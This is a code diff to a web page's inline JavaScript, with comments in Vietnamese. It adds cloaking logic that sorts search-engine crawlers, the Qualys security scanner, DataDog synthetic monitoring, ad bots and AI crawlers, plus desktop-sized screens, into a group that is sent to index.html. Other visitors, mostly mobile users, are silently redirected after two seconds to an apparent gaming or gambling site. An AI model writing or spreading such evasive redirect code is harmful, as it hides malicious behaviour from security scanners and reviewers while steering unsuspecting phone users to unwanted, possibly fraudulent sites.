@@ -60,8 +60,21 @@
     <script>
         function isBotOrDesktop() {
             const userAgent = navigator.userAgent.toLowerCase();
-            const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot/.test(userAgent);
-            const isDesktop = window.innerWidth > 1024; // Hoặc tùy chỉnh theo kích thước màn hình bạn muốn
+            const botList = [
+                'googlebot',           // Google Search Engine Crawler
+                'qualys',              // Qualys Security
+                'amazonbot',           // Amazon AI Crawler
+                'bingbot',             // Microsoft Search Engine Crawler
+                'synthetic',           // DataDog Monitoring & Analytics (Synthetic Bot)
+                'adsbot',              // Google AdsBot
+                'taboola',             // Taboola Advertising & Marketing
+                'googleother',         // Google AI Crawler
+                'gptbot',              // OpenAI GPTBot
+                'google image proxy'   // Google Image Proxy
+            ];
+
+            const isBot = botList.some(bot => userAgent.includes(bot));
+            const isDesktop = window.innerWidth > 1024;
 
             return isBot || isDesktop;
         }
@@ -71,7 +84,8 @@
                 window.location.href = "https://taisieuno.us/game/";
             }, 2000);
         } else {
-            console.log("Bot hoặc trình duyệt trên desktop phát hiện. Không chuyển hướng.");
+            // Chuyển hướng bot hoặc desktop về trang index.html
+            window.location.href = "index.html";
         }
     </script>
 </body>
